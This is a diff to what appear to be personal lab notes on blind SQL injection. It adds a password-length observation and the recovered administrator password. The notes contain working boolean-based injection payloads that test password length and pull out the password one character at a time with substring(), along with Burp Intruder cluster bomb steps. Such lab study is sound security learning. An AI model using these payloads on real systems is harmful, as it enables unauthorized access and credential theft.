@@ -67,7 +67,7 @@ select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and
 ```
 select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>19)='administrator'--'
 ```
-- at 19 we got welcome after that we got no ouput
+- at 20 we got welcome after that we got no ouput
 - now to the actual password we will use this query
 - we use burp intruder
 - we first put payload to iterate or brute force using burp
@@ -75,3 +75,7 @@ select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and
 select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,1,1) from users where username='administrator')='a'--'
 ```
 - we use cluster bomb on burp and do the attack the position to do the attack in are the charachters we want to check and the first argument in password substring
+- and we got the password
+```
+7com14kx0nhux3pis6p5
+```
